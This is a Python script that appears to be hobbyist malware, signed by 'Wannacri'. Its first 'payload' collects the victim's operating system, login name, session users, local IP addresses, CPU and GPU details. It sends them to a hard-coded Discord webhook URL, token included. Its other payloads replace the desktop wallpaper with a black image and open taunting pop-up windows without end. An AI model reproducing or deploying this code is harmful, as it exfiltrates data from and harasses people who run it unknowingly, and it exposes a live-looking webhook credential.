import os; import psutil
import requests; import platform
import wmi; import ctypes
import tkinter as tk; import random 
import time

print("Operating System:", os.name)
print("User Name:", os.getlogin())
print("Username/Password:", psutil.users())
print("CPU:", platform.processor())
print("GPU:")

# Connect WMI to the service 
c = wmi.WMI()

# Get GPU information 
for adapter in c.Win32_VideoController():
    print(adapter.Name)

connections = psutil.net_connections(kind="inet4")

# Extract IP addresses
ip_addresses = [conn.laddr.ip for conn in connections]

# Concatenate the IP addresses as a string
ip_addresses_str = ", ".join(ip_addresses)

# Format the message
message = f"```\nOperating System: {os.name}\nUser Name: {os.getlogin()}\nUsername/Passwords: {psutil.users()}\nNetwork: {ip_addresses_str}\nCPU: {platform.processor()}\nGPU: {adapter.Name}```"

# Set the Discord webhook URL
url = "https://discord.com/api/webhooks/1077956883257753660/dHsrZiymCOWigG-5mKOgflAJmpi_ouR-FAjBs-_Ffig_4nLQkHy3cIEU344qQNMv62Ru"

# Set the message payload
payload = {
    "content": message
}

# Send the message to the webhook
response = requests.post(url, json=payload)

# Check if the request was successful
if response.status_code == 204:
    print("\nMessage sent successfully.")
else:
    print("\nError sending message.")

# End Payload 1/ Beginning Payload 2

# Set the path of the new folder 
folder_path = "C:\\sysregi"

# Create new folder if it doesn't already exist
if not os.path.exists(folder_path):
    os.makedirs(folder_path)

# Set the URL of the image file to use as the desktop background
image_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c8/Very_Black_screen.jpg/800px-Very_Black_screen.jpg?20200816082819"

# Set the path to save the downloaded image
image_path = "C:\\sysregi\\image.jpg"

# Download the image from the URL
response = requests.get(image_url)
with open(image_path, "wb") as f:
    f.write(response.content)

# Set the SPI_SETDESKWALLPAPER flag
SPI_SETDESKWALLPAPER = 20

# Call the SystemParametersInfo function to set the desktop wallpaper
ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)

# End Payload 2/ Beginning Payload 3

# Create the main application window
root = tk.Tk()

# Define a list of possible messages
messages = [
    "still using this pc?",
    "hahaaa",
    "DpuSdy3fAHwcFSa9dl3b",
    "i8GWkzxTyM6jOoyk5fja."
    "v6iG73VQvLugqMNwtNo9"
]

# Define a function to create and display a new text box
def create_text_box():
    # Generate a random position for the text box
    x = random.randint(0, root.winfo_screenwidth() - 200)
    y = random.randint(0, root.winfo_screenheight() - 200)
    
    # Create a new text box at the random position
    text_box = tk.Toplevel(root)
    text_box.geometry(f"200x100+{x}+{y}")
    text_box.title("oopsies")
    
    # Select a random message from the list
    message = random.choice(messages)
    
    # Display the message in a label widget
    label = tk.Label(text_box, text=message)
    label.pack()

    # Schedule the function to be called again in 1 second
    root.after(5000, create_text_box)

# Start the loop by calling the function once
create_text_box()

# Run the main event loop until the program is closed
root.mainloop()

# Created by Wannacri/ https://github.com/Wannacri/ Wannacry#1917